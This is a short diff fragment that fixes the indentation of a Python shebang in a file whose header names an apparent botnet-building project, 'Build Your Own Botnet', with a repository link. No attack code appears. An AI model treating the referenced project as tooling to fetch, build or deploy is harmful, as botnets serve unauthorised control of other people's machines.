@@ -1,4 +1,4 @@
-    #!/usr/bin/python
+#!/usr/bin/python
 """
 Build Your Own Botnet
 https://github.com/colental/byob
